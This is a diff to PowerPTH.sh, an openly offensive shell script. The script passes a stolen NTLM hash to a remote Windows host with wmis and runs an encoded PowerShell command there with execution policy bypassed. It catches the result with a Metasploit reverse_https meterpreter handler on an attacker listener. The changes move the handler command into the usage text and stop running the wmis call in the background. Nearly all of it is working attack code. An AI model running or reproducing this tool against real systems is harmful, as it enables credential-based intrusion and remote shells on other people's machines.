@@ -9,6 +9,8 @@ then
 	echo " "
 	echo "Usage: ./PowerPTH.sh RHOST Username Hash LHOST LPORT"
 	echo "Example: ./PowerPTH.sh 192.168.1.2 domain/administrator 00000000000000000000000000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 192.168.1.1 443"
+	echo "Make sure you start a multi/handler:"
+	echo "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443"
 	exit 1
 fi
 
@@ -70,8 +72,9 @@ command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo "The commandline syntax is $command"
 
 sleep 3
-#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command"" in the background
-"wait 30; /pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"" &
+#execute wmis -U "$user"%"$hash" //"$rhost" "$command"
+/pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"
 
-echo "Starting the multi handler"
-msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
+#echo "Starting the multi handler"
+#msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
+#May add this back, but it creates a race condition with the wmis command
